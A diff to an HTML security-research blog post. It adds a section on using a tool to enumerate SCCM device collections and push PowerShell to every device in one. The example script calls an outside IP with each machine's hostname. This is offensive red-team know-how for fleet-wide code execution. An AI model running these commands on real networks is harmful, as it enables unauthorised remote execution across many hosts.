@@ -29,7 +29,7 @@
 								<li><a href="#2" id="sec2-link"><span>Getting sysadmin in MSSQL</span></a></li>
 								<li><a href="#3" id="sec3-link"><span>SCCM Admin Impersonation</span></a></li>
 								<li><a href="#4" id="sec4-link"><span>PowerShell Across Collections</span></a></li>
-								<li><a href="#5" id="sec5-link"><span>Extra Enumeration</span></a></li>
+								<li><a href="#5" id="sec5-link"><span>Closing Thoughts</span></a></li>
 							</ul>
 						</nav>
 
@@ -262,6 +262,48 @@
                                 <header>
                                     <h2>PowerShell Across Collections</h2>
                                 </header>
+
+                                <h3>Collection Information</h3>
+                                <p>
+                                    To start, here are commands to view information about device collections.
+                                </p>
+
+                                <h4><code style="background-color:lightblue;">collection_list</code></h4>
+                                <p>
+                                    List all device collections. Take note of the <code>SiteID</code> column for future commands.
+                                    <pre>collection_list</pre>
+                                    <img src="images/SCCM_MSSQL/Collections/collection_list.png" style="width: 50%;">
+                                </p>
+
+                                <h4><code style="background-color:lightblue;">collection_members</code></h4>
+                                <p>
+                                    List members of the collection with the specified <code>SiteID</code>.
+                                    <pre>collection_members</pre>
+                                    <img src="images/SCCM_MSSQL/Collections/collection_members.png" style="width: 50%;">
+                                </p>
+
+                                <h3>Executing Scripts</h3>
+                                <p>
+                                    Now, here is the command to execute PowerShell across entire device collections.
+                                </p>
+
+                                <h4><code style="background-color:lightblue;">collection_run_script</code></h4>
+                                <p>
+                                    Runs the stored PowerShell script across all devices in the collection with the specified <code>SiteID</code>.<br>
+                                    
+                                    <h4>Steps:</h4>
+                                    <ol>
+                                        <li>Use <code>set_ps1_script</code> with raw PowerShell or <code>load_ps1_script</code> with a specified file path</li>
+                                        <li>Optionally use <code>collection_list</code> to get the SiteID you want</li>
+                                        <li>Use <code>collection_run_script</code> to queue the PowerShell script to be executed</li>
+                                    </ol>
+                                    <h4>Example:</h4>
+                                    <pre>set_ps1_script Invoke-WebRequest “http://10.2.10.33/$(hostname)”
+collection_list Clients
+collection_run_script SMSDM003</pre>
+                                    <img src="images/SCCM_MSSQL/Collections/collection_run_script.png">
+                                </p>
+
                             </div>
 						</div>
 					</section>
@@ -270,8 +312,17 @@
 						<div class="container">
                             <div class="content">
                                 <header>
-                                    <h2>Extra Enumeration</h2>
+                                    <h2>Closing Thoughts</h2>
                                 </header>
+
+                                <p>
+                                    This blog only covers the highlights of my research.
+                                    I encourage you to try out the
+                                    <a href="https://github.com/bokkisec/sccmsqlclient">tool</a>
+                                    for yourself to see all of the commands by the original developer along with a few others I wrote,
+                                    and maybe come up with your own commands/queries.
+                                    This topic seems largely unexplored, so I'm excited to see what people come up with in the future.
+                                </p>
                             </div>
 						</div>
 					</section>
